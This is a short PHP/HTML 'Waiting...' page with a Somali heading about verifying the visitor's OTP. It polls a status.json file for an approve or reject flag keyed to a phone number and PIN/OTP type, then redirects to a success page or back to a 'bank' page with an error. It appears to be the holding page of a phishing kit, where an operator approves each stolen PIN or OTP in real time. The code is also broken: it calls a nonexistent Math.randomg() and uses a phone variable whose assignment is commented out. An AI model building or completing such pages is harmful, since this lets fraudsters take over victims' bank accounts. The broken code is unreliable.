<?php
//$phone = $_GET['phone'] ?? '';
//$type  = $_GET['type'] ?? 'pin';
//$file  = __DIR__ . "/status.json";

// Poll every 2 seconds via JavaScript
?>
<!DOCTYPE html>
<html>
<head>
<title>Waiting...</title>
<link rel="stylesheet"href="style.css">
<script>
function checkStatus() {
    fetch('status.json?t=' + Math.randomg())
        .then(response => response.json())
        .then(data => {
            //const phone = "<?php echo $phone; ?>";
            const type = "<?php echo $type; ?>";
            if(data[phone] && data[phone][type]) {
                const status = data[phone][type];
                if(status === 'approve') {
                    window.location.href = "sucess.php?phone=" + phone;
                } else if(status === 'reject') {
                    window.location.href = "bank.php?phone=" + phone + "&error=1";
                }
            }
        })
        .catch(err => console.log(err));
}

// Check every 2 seconds
setInterval(checkStatus, 2000);
</script>
</head>
<body>
<h2>FADLAN SUG INTA AAN XAQIIJINAYNO OTP-GAAGA KOOWAD...</h2>
<p>Verifying...</p>
</body>
</html>